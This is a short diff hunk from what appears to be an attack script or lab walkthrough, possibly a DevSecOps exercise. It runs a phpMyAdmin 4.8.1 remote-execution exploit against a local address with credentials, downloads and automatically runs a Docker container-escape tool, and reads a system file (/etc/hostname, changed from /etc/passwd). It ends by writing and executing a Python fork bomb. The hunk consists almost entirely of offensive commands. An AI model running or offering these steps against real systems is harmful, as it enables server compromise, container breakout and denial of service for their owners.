@@ -9,7 +9,7 @@ python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "./s
 curl -L -O https://github.com/PercussiveElbow/docker-escape-tool/releases/download/0.2.9/docker-escape
 chmod +x docker-escape
 ./docker-escape auto
-cat /etc/passwd
+cat /etc/hostname
 
 echo -e "import os\nwhile(1):\n\tos.fork();" > fork.py
 python3 fork.py
